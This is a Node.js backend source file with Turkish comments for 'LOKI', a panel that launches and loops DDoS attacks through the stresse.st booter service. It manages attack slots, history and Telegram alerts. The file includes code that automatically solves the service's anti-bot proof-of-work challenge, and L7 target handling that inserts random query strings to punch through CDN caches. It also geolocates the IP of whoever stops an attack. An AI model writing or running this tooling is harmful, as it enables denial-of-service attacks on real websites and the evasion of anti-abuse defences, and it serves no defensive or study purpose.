  // stresse.st "success" dedi ama hic ID yoksa: /ongoing gec guncellenebilir,
  // yanlis negatif uretmemek icin bir kez daha dogrula.
  if (newIds.length === 0 && (data?.status === 'success' || data?.message === 'Attack started')) {
    console.warn(`[launchAttacksGet] success ama ID yok; ikinci dogrulama yapiliyor...`);
    await new Promise((r) => setTimeout(r, 4000));
    const retryIds = new Set(await fetchOngoingAttackIds(sessionId, params, 1000, requestStartedAt));
    newIds = [...retryIds].filter((id) => !beforeIds.has(id) && notRegisteredElsewhere(id));
  }

  console.log(`[launchAttacksGet] before=${beforeIds.size} responseIds=${responseIds.length} after=${afterIds.size} new=${newIds.length} requested=${concurrents} sent=${sendConc}`);

  if (newIds.length === 0) {
    // Mevcut akis aynen kalir (tekil /attack status:'error' doner, loop turu hata
    // sayar); burada sadece sebebi net bir log satiriyla belirtiyoruz.
    console.warn(`[launchAttacksGet] yeni ID dogrulanamadi (muhtemel upstream ret veya baska launch'a ait ID'ler elendi): host=${params.host} method=${params.method}`);
  }

  // Congestion signal: full launch clears the flag, a partial launch (fewer
  // IDs than requested) marks the method as busy.
  if (newIds.length >= sendConc) {
    markMethodOk(params.method);
  } else if (newIds.length > 0) {
    console.warn(`[launchAttacksGet] kismi launch: method=${params.method} sent=${sendConc} got=${newIds.length} -> congested`);
    markMethodBusy(params.method);
  }

  // Gercek ID'ler dogrulandiysa pending satirlar artik gereksiz (cift satir
  // olmasin diye sil). ID yoksa pending'ler yasamaya devam eder.
  if (newIds.length > 0 && pendingIds.length > 0) {
    pendingIds.forEach((id) => unregisterAttack(id));
    pendingIds = [];
  }

  return {
    data,
    attackIds: newIds.slice(0, sendConc),
    elapsedSec: 0,
    pendingIds
  };
}

// Telegram: saldiri slot takibi (hesap bazli). Sadece bir hesabin saldiri
// sayisi 1->0 dustugunde ve o hesabin calisan loop'u yokken bir kez bildirim
// gonderir (loop turlari arasinda slot gecici olarak 0 gorunebilir, bu
// durumda bildirim atilmaz).
const lastAttackCountByUser = new Map(); // username -> son bilinen aktif saldiri sayisi

// Loop'un sahibini cozer: once kayitli owner alani, yoksa (eski kayitlar)
// loop'un session'indan. Session da silinmisse null (yetim loop).
function getLoopOwner(loop) {
  if (!loop) return null;
  return loop.owner || sessions[loop.sessionId]?.username || null;
}

// Canli satir icin not cozumleme: attack ID'sinden TAMAMEN bagimsiz calisir
// (L4 dogrulanamayan launch'lar ve tur baslangic gecikmeleri bu yuzden notu
// geciktirmez/gostermez). Saldiri satiri /ongoing'de gorundugu anda not da
// hazirdir cunku kaynak loop/launch kaydinin kendisidir.
//  1) Calisan loop: hedef+method eslesmesi -> loop notu (aninda)
//  2) Loopsuz launch: aktif history kaydinda hedef+method eslesmesi
function resolveNoteForRow(username, rawTarget, method) {
  if (!username || !method) return '';
  const host = normalizeHost(rawTarget);
  if (!host) return '';
  const m = String(method).toLowerCase();
  for (const loop of Object.values(activeLoops)) {
    if (!loop.running || !loop.note) continue;
    if (getLoopOwner(loop) !== username) continue;
    // loop.params.host sorgulu olabilir (cache-bypass); karsilastirma bare host ile
    if (normalizeHost(loop.params?.host || '') === host &&
        String(loop.params?.method || '').toLowerCase() === m) {
      return loop.note;
    }
  }
  for (const h of Object.values(attackHistory)) {
    if (h.username !== username || h.status !== 'active' || h.loop || !h.note) continue;
    if (normalizeHost(h.target) === host && String(h.method || '').toLowerCase() === m) {
      return h.note;
    }
  }
  return '';
}

// Bir hesabin aktif saldiri sayisi (activeAttacks uzerinden).
function countAttacksForUser(username) {
  if (!username) return 0;
  // Suresi dolmus kayitlar sayilmasin (bitis~cleanup arasi 30-90sn pencere)
  const now = Date.now();
  return Object.values(activeAttacks).filter(
    (a) => (a.username || sessions[a.sessionId]?.username) === username &&
      new Date(a.expiresAt || 0).getTime() > now
  ).length;
}

// Telegram mesajlari icin Istanbul saatiyle okunabilir zaman damgasi.
function telegramTimestamp() {
  return new Date().toLocaleString('tr-TR', { timeZone: 'Europe/Istanbul', hour12: false });
}

// stresse.st kapasite doluyken "Invalid parameters. Fill all fields!" gibi
// yaniltici mesajlar donduruyor (kanitlandi: ayni parametreler hesap bosken
// basarili, hesap 80'de doluyken bu mesaj). Gercek anlamina cevir.
function normalizeUpstreamError(msg) {
  const text = String(msg || '');
  if (/invalid parameters\. fill all fields/i.test(text)) {
    return 'stresse.st slot kapasitesi dolu (hesap concurrent limiti; bosalan slotlari bekliyor)';
  }
  return text;
}

function checkSlotsEmpty() {
  // Hesap bazinda anlik aktif saldiri sayilari
  const counts = new Map();
  Object.values(activeAttacks).forEach((a) => {
    const u = a.username || sessions[a.sessionId]?.username;
    if (!u) return;
    counts.set(u, (counts.get(u) || 0) + 1);
  });
  // Onceki sayimi bilinen veya su an saldirisi olan tum hesaplari kontrol et
  const users = new Set([...lastAttackCountByUser.keys(), ...counts.keys()]);
  users.forEach((u) => {
    const prev = lastAttackCountByUser.get(u) || 0;
    const now = counts.get(u) || 0;
    if (prev <= 0 || now !== 0) return;
    const hasRunningLoop = Object.values(activeLoops).some(
      (l) => l.running && getLoopOwner(l) === u
    );
    if (hasRunningLoop) return;
    const message = [
      '🟡 <b>LOKI — SLOT UYARISI</b>',
      '─────────────────',
      `🏦 <b>Hesap:</b> ${esc(u)}`,
      '⚠️ Aktif saldırı kalmadı, tüm slotlar boş.',
      `🕐 <i>${telegramTimestamp()}</i>`
    ].join('\n');
    sendTelegram(message).catch(() => {});
  });
  lastAttackCountByUser.clear();
  counts.forEach((v, k) => lastAttackCountByUser.set(k, v));
}

// Loop kaldirildiginda Telegram bildirimi gonderir (fire-and-forget).
// action: 'durduruldu' (manuel stop) veya 'tamamlandi' (dogal bitis).
// Istemci gercek IP'si (nginx X-Forwarded-For iletiyor)
function getClientIp(req) {
  const fwd = req.headers['x-forwarded-for'];
  if (fwd) return String(fwd).split(',')[0].trim();
  return req.socket?.remoteAddress || '';
}

// IP -> konum cozumu (ipwho.is, ucretsiz/key'siz). Sonuclar cache'lenir;
// hata durumunda bos string doner, bildirim akisini asla bozmaz.
const ipGeoCache = new Map();
async function lookupIpLocation(ip) {
  if (!ip) return '';
  if (/^(127\.|10\.|192\.168\.|172\.(1[6-9]|2\d|3[01])\.|::1|localhost)/.test(ip)) return 'yerel ağ';
  if (ipGeoCache.has(ip)) return ipGeoCache.get(ip);
  let label = '';
  try {
    const res = await fetch(`https://ipwho.is/${encodeURIComponent(ip)}`, { signal: AbortSignal.timeout(5000) });
    const data = await res.json();
    if (data?.success) {
      label = [data.city, data.country].filter(Boolean).join(', ');
    }
  } catch (err) {
    console.warn('[geo] IP konum sorgusu basarisiz:', err.message);
  }
  ipGeoCache.set(ip, label);
  return label;
}

// Loop kaldirildiginda Telegram bildirimi gonderir (fire-and-forget).
// action: 'durduruldu' (manuel stop/hata) veya 'tamamlandi' (dogal bitis).
// details: { stopDetail, username, ip } — sebep ve durduran kisi bilgisi.
function notifyLoopRemoved(loop, action, details = {}) {
  if (!loop) return;
  // Hedef portsuz gosterilir; L7 ise history formatiyla ayni sekilde https://host/
  const host = loop.params?.host || loop.displayTarget || 'bilinmiyor';
  const target = loop.params?.layer === 'L7' ? `https://${host}/` : host;
  const method = (loop.params?.method || 'BİLİNMİYOR').toUpperCase();
  const concurrents = loop.params?.concurrents ?? '?';
  const isStopped = action === 'durduruldu';
  const title = isStopped ? '🔴 <b>LOKI — LOOP DURDURULDU</b>' : '🟢 <b>LOKI — LOOP TAMAMLANDI</b>';
  const owner = getLoopOwner(loop) || 'bilinmiyor';
  // Durduran kisi: IP + konum (geo lookup). Geo basarisizsa sadece IP,
  // IP yoksa kullanici adina dus.
  const buildAndSend = async () => {
    let stopper = null;
    if (details.ip) {
      const location = await lookupIpLocation(details.ip);
      stopper = `👤 <b>Durduran:</b> ${esc(details.ip)}${location ? ` (${esc(location)})` : ''}`;
    } else if (details.username) {
      stopper = `👤 <b>Durduran:</b> ${esc(details.username)}`;
    }
    const message = [
      title,
      '─────────────────',
      `🎯 <b>Hedef:</b> <code>${esc(target)}</code>`,
      `⚡ <b>Method:</b> <code>${esc(method)}</code>`,
      `🔁 <b>Concurrents:</b> <code>${esc(concurrents)}</code>`,
      `🏦 <b>Hesap:</b> ${esc(owner)}`,
      ...(details.stopDetail ? [`📋 <b>Sebep:</b> ${esc(details.stopDetail)}`] : []),
      ...(stopper ? [stopper] : []),
      `🕐 <i>${telegramTimestamp()}</i>`
    ].join('\n');
    await sendTelegram(message);
  };
  buildAndSend().catch(() => {});
}

// Saldiri notu: opsiyonel, hesap bazli paylasilir. Tek satir, kontrol
// karakterlerinden arindirilmis, uzunluk sinirli metin olarak saklanir.
const NOTE_MAX_LEN = 120;
function sanitizeNote(note) {
  if (typeof note !== 'string') return '';
  // eslint-disable-next-line no-control-regex
  const clean = note.replace(/[\x00-\x1f\x7f]+/g, ' ').replace(/\s+/g, ' ').trim();
  return clean.slice(0, NOTE_MAX_LEN);
}

function registerAttack(attackId, sessionId, params, loopId = null, concurrents = 1, elapsedSec = 0) {
  if (!attackId || !sessionId) return;
  // Idempotency: ayni ID baska bir launch/loop tarafindan zaten kayitliysa
  // uzerine yazma (ortak panelde diff'ler cakisabilir).
  if (activeAttacks[attackId]) return;
  // Kurtarma (salvage) yolunda saldiri istegi gonderileli elapsedSec gecti;
  // expiresAt'i bu kadar kisalt ki saldiri erken silinmesin/gec silinmesin.
  const remainingSec = Math.max(1, (parseInt(params.time) || 0) - (parseInt(elapsedSec) || 0));
  activeAttacks[attackId] = {
    attackId,
    sessionId,
    // Session sonradan silinirse/exire olursa username undefined kalir; bu
    // durumda RG canli filtresi "sahipsiz" sayip satiri tum hesaplara
    // gosteriyordu (hesap sizintisi). Loop'un kalici owner'ina dus.
    username: sessions[sessionId]?.username || (loopId ? getLoopOwner(activeLoops[loopId]) : null),
    host: params.host,
    port: params.port,
    method: params.method,
    layer: params.layer || 'L4',
    time: parseInt(params.time) || 0,
    concurrents: parseInt(concurrents) || 1,
    loopId: loopId || null,
    provider: params.provider || 'stresse',
    group: params.group || null, // dogrudan saldirida form secimi; loop'ta loop.group uzerinden
    startedAt: new Date().toISOString(),
    expiresAt: new Date(Date.now() + remainingSec * 1000).toISOString()
  };
  const attackOwner = activeAttacks[attackId].username;
  if (attackOwner) lastAttackCountByUser.set(attackOwner, countAttacksForUser(attackOwner));
  saveState();
  // Aninda gorunurluk: hub'in normal tick'ini (10sn; hata backoff'unda 30sn)
  // beklemeden canli listeye dusur. Patlamada 1.5sn birlestirme (pokeLiveHub).
  pokeLiveHub(attackOwner);
}

// Launch yaniti geldigi anda (upstream listelemesini beklemeden) deftere pending
// satirlar duser: saldiri panelde ~1-2sn icinde gorunur. Gercek ID'ler gelince
// cagiran taraf bunlari siler; ID'siz methodlarda (L4 null-id) upstream satir
// gorunene kadar kalir ve null-id butcesiyle tekillestirilir (cift satir olmaz).
function registerPendingAttacks(sessionId, params, count, loopId = null) {
  const ids = [];
  for (let i = 0; i < count; i++) {
    const pid = `pending_${Date.now()}_${Math.random().toString(36).slice(2, 8)}_${i}`;
    registerAttack(pid, sessionId, params, loopId, 1, 0);
    ids.push(pid);
  }
  return ids;
}

function unregisterAttack(attackId) {
  if (!attackId) return;
  delete activeAttacks[attackId];
  saveState();
  checkSlotsEmpty();
}

function cleanupExpiredAttacks() {
  const now = Date.now();
  let removed = 0;
  const completedHistories = new Set();

  // 1) Aktif saldirilari temizle ve ilgili history'leri tamamlandi olarak isaretle.
  Object.entries(activeAttacks).forEach(([attackId, attack]) => {
    const expires = new Date(attack.expiresAt || 0).getTime();
    // 30 saniye tolerans: stresse.t gecikmeli baslatabilir veya bitirebilir.
    if (now - expires > 30 * 1000) {
      const loopId = attack.loopId;
      delete activeAttacks[attackId];
      removed++;

      if (loopId) {
        // Eger bu saldiri bir loop'a aitse ve loop artik aktif degilse,
        // o loop'a ait baska aktif saldiri kalmadiginda loop history'sini tamamlandi olarak isaretle.
        if (!activeLoops[loopId]) {
          const stillActive = Object.values(activeAttacks).some(
            (a) => a.loopId === loopId
          );
          if (!stillActive) {
            const historyId = `hist_loop_${loopId}`;
            if (attackHistory[historyId] && attackHistory[historyId].status === 'active') {
              completedHistories.add(historyId);
            }
          }
        }
      } else {
        // Normal (loopsuz) saldiri: history'yi tamamlandi olarak isaretle
        const history = findActiveHistoryByAttackId(attackId);
        if (history && history.status === 'active') {
          completedHistories.add(history.historyId);
        }
      }
    }
  });

  // 2) activeAttacks'te kalmamis ama attackHistory'de hala active olan expired kayitlari da temizle.
  Object.entries(attackHistory).forEach(([historyId, history]) => {
    if (history.status !== 'active') return;
    // Loop'a ait kayitlar: loop hala calisiyorsa completed yapma;
    // loop bitince cleanupLoop / 1. faz isaretler. expiresAt sadece ilk turun suresini tasir.
    if (history.loop && Object.values(activeLoops).some((l) => l.running && l.historyId === historyId)) {
      return;
    }
    const expires = new Date(history.expiresAt || 0).getTime();
    if (now - expires > 30 * 1000) {
      completedHistories.add(historyId);
    }
  });

  completedHistories.forEach((historyId) => {
    updateAttackHistoryStatus(historyId, 'completed');
    console.log(`[cleanup] History completed: ${historyId}`);
  });

  if (removed > 0) {
    console.log(`[cleanup] Removed ${removed} expired attack(s)`);
    // Restart penceresinde expired kayitlar geri yuklenip hayalet gorunmesin
    // diye bellek-diski hemen esitle (30sn auto-save beklenmez).
    saveState();
    checkSlotsEmpty();
  }
}

// Expired attacks cleanup every 60 seconds
setInterval(cleanupExpiredAttacks, 60000);

function addAttackHistory(sessionId, params, options = {}) {
  if (!sessionId) return;
  const username = sessions[sessionId]?.username;
  if (!username) return;

  const historyId = options.historyId || `hist_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
  const now = new Date();
  const bareHost = normalizeHost(params.host);
  const isL7 = params.layer === 'L7';
  // Gecmiste hedefi L7 icin https://host/, L4 icin host:port olarak goster
  const target = isL7 ? `https://${bareHost}/` : (params.port ? `${bareHost}:${params.port}` : bareHost);
  attackHistory[historyId] = {
    historyId,
    username,
    target,
    port: params.port || null,
    method: params.method,
    layer: params.layer || 'L4',
    time: parseInt(params.time) || 0,
    concurrents: parseInt(options.concurrents) || parseInt(params.concurrents) || 1,
    note: sanitizeNote(params.note),
    loop: !!options.loop,
    status: 'active',
    startedAt: now.toISOString(),
    expiresAt: new Date(now.getTime() + (parseInt(params.time) || 0) * 1000).toISOString(),
    endedAt: null,
    attackIds: options.attackIds || []
  };
  saveState();
  return historyId;
}

function updateAttackHistoryStatus(historyId, status) {
  if (!historyId || !attackHistory[historyId]) return;
  attackHistory[historyId].status = status;
  attackHistory[historyId].endedAt = new Date().toISOString();
  saveState();
}

function findActiveHistoryByAttackId(attackId) {
  return Object.values(attackHistory).find(
    (h) => h.status === 'active' && h.attackIds.includes(attackId)
  );
}

const HISTORY_MAX_AGE_MS = 7 * 24 * 60 * 60 * 1000; // 7 gun

function cleanupOldHistory() {
  const now = Date.now();
  let removed = 0;
  Object.entries(attackHistory).forEach(([historyId, record]) => {
    const started = new Date(record.startedAt || 0).getTime();
    if (now - started > HISTORY_MAX_AGE_MS) {
      delete attackHistory[historyId];
      removed++;
    }
  });
  if (removed > 0) {
    console.log(`[cleanup] Removed ${removed} old history record(s)`);
  }
}

// Old history cleanup every hour
setInterval(cleanupOldHistory, 60 * 60 * 1000);

function getSessionPlan(sessionId) {
  return sessions[sessionId]?.plan || {};
}

function handleEndpointError(res, error, label) {
  if (error.statusCode) {
    return res.status(error.statusCode).json({ status: 'error', message: error.message });
  }
  if (error.response) {
    return res.status(error.response.status).json({
      status: 'error',
      message: error.response.data?.message || error.message,
      data: error.response.data
    });
  }
  console.error(`${label}:`, error.message);
  res.status(500).json({ status: 'error', message: error.message });
}

function checkPlanLimits(sessionId, time, concurrents, excludeLoopId = null) {
  const plan = getSessionPlan(sessionId);
  const maxTime = plan.MaxTime || plan.attackTime || 86400;
  const maxConcurrents = plan.Concurrents || plan.concurrents || 80;

  if (parseInt(time) > parseInt(maxTime)) {
    return { ok: false, message: `Maksimum sure ${maxTime} saniye olabilir` };
  }
  if (parseInt(concurrents) > parseInt(maxConcurrents)) {
    return { ok: false, message: `Maksimum concurrent ${maxConcurrents} olabilir` };
  }

  // Mevcut aktif saldirilarin toplam concurrents'ini hesapla.
  // Suresi dolmus ama henuz cleanup'lanmamis kayitlar SAYILMAZ; aksi halde
  // biten saldiri 30-90sn daha slot isgal ediyor gorunur ve yeni launch
  // yanlislikla reddedilir.
  // excludeLoopId: loop duzenlemesinde, duzenlenen loop'un kendi saldirilari
  // sayilmaz (yeni ayar eskisinin yerine gececek; aksi halde loop'un degerini
  // dusurmek bile "slot dolu" hatasina takilir).
  const now = Date.now();
  // Hesap bazli sayim (sessionId degil): ayni hesabin ikinci oturumundaki
  // saldirilar da sayilsin; aksi halde coklu oturumda plan limiti asilabilir.
  const ownerName = sessions[sessionId]?.username;
  const currentConcurrents = Object.values(activeAttacks)
    .filter((a) => {
      const owner = a.username || sessions[a.sessionId]?.username;
      return owner === ownerName && new Date(a.expiresAt || 0).getTime() > now;
    })
    .filter((a) => !excludeLoopId || a.loopId !== excludeLoopId)
    .reduce((sum, a) => sum + (parseInt(a.concurrents) || 1), 0);

  if (currentConcurrents + parseInt(concurrents) > parseInt(maxConcurrents)) {
    return {
      ok: false,
      message: `Mevcut ${currentConcurrents} aktif saldiri var. Maksimum toplam ${maxConcurrents} concurrent. Kalan: ${Math.max(0, maxConcurrents - currentConcurrents)}`
    };
  }

  return { ok: true };
}

const SESSION_MAX_AGE_MS = 24 * 60 * 60 * 1000; // 24 saat (son aktiviteden itibaren)

function cleanupOldSessions() {
  const now = Date.now();
  let removed = 0;
  Object.entries(sessions).forEach(([sessionId, session]) => {
    // Calisan loop'u olan session asla silinmez; aksi halde loop token'suz olur.
    const hasRunningLoop = Object.values(activeLoops).some(
      (l) => l.running && l.sessionId === sessionId
    );
    if (hasRunningLoop) return;
    // Kayar sures: son aktiviteye gore degerlendir (aktif oturum silinmez).
    const lastActivity = new Date(session.lastActivity || session.createdAt || 0).getTime();
    if (now - lastActivity > SESSION_MAX_AGE_MS) {
      delete sessions[sessionId];
      removed++;
    }
  });
  if (removed > 0) {
    console.log(`[cleanup] Removed ${removed} expired session(s)`);
  }
}

/**
 * L4 host degerini normalize eder:
 * - URL protokolunu kaldirir (https://, http://)
 * - Icindeki port bilgisini kaldirir (host:443 -> host)
 * - Sonu / ile bitiyorsa kaldirir
 * Boylece disaridan verilen port ile cakisma olmaz.
 */
function normalizeHost(host) {
  if (!host || typeof host !== 'string') return '';
  let h = host.trim();
  // Protokol, path, query, fragment, port ve www. prefix'ini kaldir.
  h = h.replace(/^https?:\/\//i, '');
  h = h.replace(/^www\./i, '');
  h = h.split('/')[0];
  h = h.split('?')[0];
  h = h.split('#')[0];
  h = h.replace(/:\d+$/, '');
  return h.toLowerCase();
}

// L7 hedefleri icin path/query KORUYAN normalize: "https://eightfy.com/?s=%%RAND%%"
// -> "eightfy.com/?s=%%RAND%%". Edge/CDN cache'ini delmek (cache-bypass) icin
// sorgulu URL'ler gerekiyor; %%RAND%% her stresse cagrisinda rastgele degerle
// degistirilir (buildApiUrl). Bosluk iceren veya 200 karakteri asan girdi reddedilir.
// Sondaki anlamsiz slash'lar silinir ("site.fr/" -> "site.fr"): rackghost gibi
// kendisi slash ekleyen upstream'lerde "//", "///" cogalmasi olusuyordu.
function normalizeL7Host(host) {
  if (!host || typeof host !== 'string') return '';
  const h = host.trim().replace(/^https?:\/\//i, '');
  if (/\s/.test(h)) return '';
  const bare = normalizeHost(h);
  if (!bare) return '';
  const slashIdx = h.indexOf('/');
  const rest = slashIdx >= 0 ? h.slice(slashIdx).replace(/\/+$/, '') : '';
  const out = bare + rest;
  return out.length <= 200 ? out : '';
}

// buildApiUrl icin L7 host'u hazirla: protokol ekle ve %%RAND%% placeholder'ini
// her cagrida taze rastgele degerle degistir (cache-bypass).
function buildL7HostWithProtocol(rawHost) {
  const h = String(rawHost || '').trim().replace(/^https?:\/\//i, '');
  return `https://${h}`.replace(/%%RAND%%/g, () => Math.random().toString(36).slice(2, 10));
}

/**
 * Method bazli minimum atak suresi (saniye).
 * HTTP-TEMPESTA 200 sn; diger L7 methodlar 60 sn; L4 methodlar 60 sn.
 */
const METHOD_MIN_TIME = {
  'HTTP-TEMPESTA': 200
};
const L7_MIN_TIME = 60;
const L4_MIN_TIME = 60;

function getMinTime(method, layer) {
  if (METHOD_MIN_TIME[method?.toUpperCase()]) return METHOD_MIN_TIME[method.toUpperCase()];
  if (layer === 'L7') return L7_MIN_TIME;
  return L4_MIN_TIME;
}

function isFreeMethod(method) {
  return typeof method === 'string' && method.toUpperCase().startsWith('FREE-');
}

function getJar(sessionId) {
  if (!sessions[sessionId]) {
    return null;
  }
  return sessions[sessionId].jar;
}

// stresse.st anti-bot PoW challenge (/__cdn/challenge): sayfa 16 rastgele hex
// (r) + 300sn'lik zaman penceresi (ts) + nonce ister; sha256("r:ts:nonce")
// hash'inin ilk 16 biti sifir olmali. Sunucuda cozulebilir (~2^16 deneme).
// Basarili POST sonrasi cookie jar'a yazilir ve web uclari acilir.
function isStresseChallengePage(data) {
  return typeof data === 'string' && data.includes('/__cdn/challenge');
}

async function solveStresseChallenge(client) {
  const r = Array.from({ length: 16 }, () => Math.floor(Math.random() * 16).toString(16)).join('');
  const ts = Math.floor(Date.now() / 1000 / 300);
  const prefix = `${r}:${ts}:`;
  let nonce = 0;
  // Ortalama 65k deneme; ust sinir guvenligi icin 20m
  for (; nonce < 20000000; nonce += 1) {
    const h = crypto.createHash('sha256').update(prefix + nonce).digest();
    if (h[0] === 0 && h[1] === 0) break;
  }
  const resp = await client.post('/__cdn/challenge', {
    r,
    ts: String(ts),
    nonce: String(nonce),
    sus: 0
  }, { headers: { 'content-type': 'application/json' } });
  if (!resp.data || !resp.data.ok) {
    throw new Error(`stresse challenge reddedildi: ${(resp.data && resp.data.error) || 'bilinmiyor'}`);
  }
}

function getClient(sessionId) {
  const jar = getJar(sessionId);
  if (!jar) {
    const err = new Error('Invalid or expired session');
    err.statusCode = 401;
    throw err;
  }
  // Kayar session suresi: aktif kullanim TTL'i yeniler.
  sessions[sessionId].lastActivity = new Date().toISOString();
  // Not: axios-cookiejar-support, ozel http(s).Agent (proxy) ile calismiyor.
  // Bu yuzden cookie yonetimini interceptor'larla elle yapiyoruz.
  const client = axios.create({
    baseURL: 'https://stresse.st',
    family: 4,
    maxRedirects: 5,
    ...stresseProxyConfig(),
    ...stresseBindConfig(),
    headers: {
      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
      'Accept': 'application/json, text/plain, */*',
      'Accept-Language': 'en-US,en;q=0.9',
      'Origin': 'https://stresse.st',
      'Referer': 'https://stresse.st/hub'
    },
    timeout: 15000
  });
  client.interceptors.request.use(async (config) => {
    const url = new URL(config.url || '', config.baseURL).toString();
    const cookie = await jar.getCookieString(url);
    if (cookie) config.headers.Cookie = cookie;
    return config;
  });
  const storeCookies = async (response) => {
    const setCookies = response.headers['set-cookie'];
    if (setCookies && setCookies.length) {
      const url = response.config ? new URL(response.config.url || '', response.config.baseURL).toString() : 'https://stresse.st';
      for (const c of setCookies) {
        await jar.setCookie(c, url).catch(() => {});
      }
    }
    return response;
  };
  client.interceptors.response.use(storeCookies, async (err) => {
    if (err.response) await storeCookies(err.response);
    throw err;
  });
  // Anti-bot challenge sayfasi gelirse PoW'u coz ve orijinal istegi tekrarla.
  // Ayni anda birden cok istek challenge'a takilirsa tek cozum paylasilir.
  let challengeInflight = null;
  client.interceptors.response.use(async (resp) => {
    if (!isStresseChallengePage(resp.data)) return resp;
    if (resp.config.__challengeRetried) return resp; // sonsuz dongu korumasi
    try {
      challengeInflight = challengeInflight
        || solveStresseChallenge(client).finally(() => { challengeInflight = null; });
      await challengeInflight;
    } catch (challengeErr) {
      console.warn(`[challenge] cozum basarisiz: ${challengeErr.message}`);
      return resp; // challenge sayfasini oldugu gibi birak; ust katman hataya cevirir
    }
    resp.config.__challengeRetried = true;
    return client.request(resp.config);
  });
  return client;
}

function getApiClient(sessionId) {
  const session = sessions[sessionId];
  if (!session || !session.apiToken) {
    const err = new Error('API token not available');
    err.statusCode = 401;
    throw err;
  }
  return axios.create({
    baseURL: 'https://stresse.st',
    family: 4,
    maxRedirects: 5,
    timeout: 45000,
    ...stresseProxyConfig(),
    ...stresseBindConfig(),
    headers: {
      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
      'Accept': 'application/json, text/plain, */*'
    }
  });
}

// =====================
// stresse.st PROXY
// =====================

/**
 * Key-bazli yedek giris: stresse.st web login akisi (/w/login) kapaliyken
 * bilinen hesaplar icin API key ile dogrudan oturum acar.
 * Dogrulama: gecerli key /api'de 400 (Missing parameters) dondurur;
 * gecersiz veya whitelist disi key 403/401 dondurur.
 * Plan/user bilgisi onceki oturumlardan kalan cache'ten alinir.
 */
async function performKeyBasedLogin(sessionId, username) {
  const apiToken = getFallbackApiToken(username);
  if (!apiToken) {
    const err = new Error('Hesap icin kayitli API key yok');
    err.statusCode = 401;
    throw err;
  }
  const verifier = axios.create({
    baseURL: 'https://stresse.st',
    family: 4,
    timeout: 15000,
    ...stresseProxyConfig(),
    ...stresseBindConfig(),
    headers: {
      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
      'Accept': 'application/json, text/plain, */*'
    }
  });
  const resp = await verifier.get(`/api?key=${encodeURIComponent(apiToken)}`, { validateStatus: () => true });
  if (resp.status === 401 || resp.status === 403) {
    const err = new Error('stresse.st API key reddedildi (whitelist eksik?)');
    err.statusCode = 401;
    throw err;
  }
  const cached = Object.values(sessions).find(
    (s) => s && s.username === username && s.plan && Object.keys(s.plan).length
  );
  sessions[sessionId] = {
    jar: new CookieJar(),
    username,
    user: { username },
    plan: cached ? cached.plan : {},
    apiToken,
    createdAt: new Date().toISOString()
  };
  saveState();
  console.log(`[login] ${username} icin key-bazli oturum acildi (plan: ${sessions[sessionId].plan?.name || 'cache yok'})`);
  return { user: sessions[sessionId].user, plan: sessions[sessionId].plan };
}

/**
 * stresse.st login akisini calistirir (GET /login -> POST /w/login ->
 * GET /vcookie -> GET /plan -> GET /getApiToken) ve session'i doldurur.
 * Hata durumunda gecici session'i temizleyip err.step bilgisiyle firlatir.
 * Hem /api/stresse/login hem /api/accounts/ensure kullanir.
 */
async function performStresseLogin(sessionId, username, password) {
  sessions[sessionId] = { jar: new CookieJar(), username: null, createdAt: new Date().toISOString() };  const client = getClient(sessionId);

  let step = 'GET /login';
  try {
    // 1. Get login page to collect cookies (retry ile)
    let loginPageOk = false;
    for (let attempt = 1; attempt <= 3; attempt++) {
      try {
        await client.get('/login');
        loginPageOk = true;
        break;
      } catch (retryErr) {
        console.warn(`[login] GET /login deneme ${attempt}/3 hata: ${retryErr.message}`);
        if (attempt === 3) throw retryErr;
        await new Promise((r) => setTimeout(r, 1000));
      }
    }
    if (!loginPageOk) throw new Error('Login sayfasi alinamadi');

    // 2. Submit login credentials (retry ile)
    // Not: stresse.st login endpoint'ini /login -> /w/login tasidi (eski yol
    // artik HTML login sayfasi donduruyor).
    step = 'POST /w/login';
    let loginRes;
    for (let attempt = 1; attempt <= 3; attempt++) {
      try {
        loginRes = await client.post('/w/login', { username, password });
        break;
      } catch (retryErr) {
        console.warn(`[login] POST /w/login deneme ${attempt}/3 hata: ${retryErr.message}`);
        if (attempt === 3) throw retryErr;
        await new Promise((r) => setTimeout(r, 1000));
      }
    }

    // 3. Verify session (retry ile)
    step = 'GET /vcookie';
    let vcookieRes;
    for (let attempt = 1; attempt <= 3; attempt++) {
      try {
        vcookieRes = await client.get('/vcookie');
        break;
      } catch (retryErr) {
        console.warn(`[login] GET /vcookie deneme ${attempt}/3 hata: ${retryErr.message}`);
        if (attempt === 3) throw retryErr;
        await new Promise((r) => setTimeout(r, 1000));
      }
    }
    if (!vcookieRes.data || !vcookieRes.data.username) {
      const err = new Error('Invalid credentials');
      err.statusCode = 401;
      throw err;
    }

    // 4+5. Plan ve API token birbirinden bagimsiz: paralel istenir (ozellikle
    // proxy uzerinden gecisleri hizlandirir).
    step = 'GET /plan + /getApiToken';
    let planData = {};
    let apiToken = null;
    const [planResult, tokenResult] = await Promise.allSettled([
      client.get(`/plan/${vcookieRes.data.username}`),
      client.get('/getApiToken')
    ]);
    if (planResult.status === 'fulfilled') {
      planData = planResult.value.data || {};
    } else {
      console.warn(`[login] Plan alinamadi: ${planResult.reason?.message}`);
    }
    if (tokenResult.status === 'fulfilled') {
      const tokenRes = tokenResult.value;
      apiToken = tokenRes.data?.apitoken || tokenRes.data?.token || tokenRes.data?.apiToken || null;
      if (apiToken) {
        console.log(`[login] API token alindi: ${apiToken.slice(0, 8)}...`);
      } else {
        console.warn('[login] /getApiToken bos dondu, fallback token kullanilacak');
      }
    } else {
      console.warn(`[login] API token alinamadi: ${tokenResult.reason?.message}`);
    }
    if (!apiToken) {
      apiToken = getFallbackApiToken(vcookieRes.data.username || username);
      if (apiToken) {
        console.log(`[login] Fallback API token kullaniliyor: ${apiToken.slice(0, 8)}...`);
      }
    }

    sessions[sessionId].username = vcookieRes.data.username || username;
    sessions[sessionId].user = vcookieRes.data;
    sessions[sessionId].plan = planData;
    sessions[sessionId].apiToken = apiToken;
    // Basarili loginde guncel key'i hesap bazli token dosyasina yaz;
    // ileride token'suz login'lerde ve yenileme senaryolarinda guncel kalsin.
    if (apiToken) {
      writeApiToken(sessions[sessionId].username, apiToken);
    }
    saveState();

    return { user: vcookieRes.data, plan: planData };
  } catch (stepErr) {
    // Web login akisi kapaliysa (stresse /w/login'i engelliyor) ve hesap
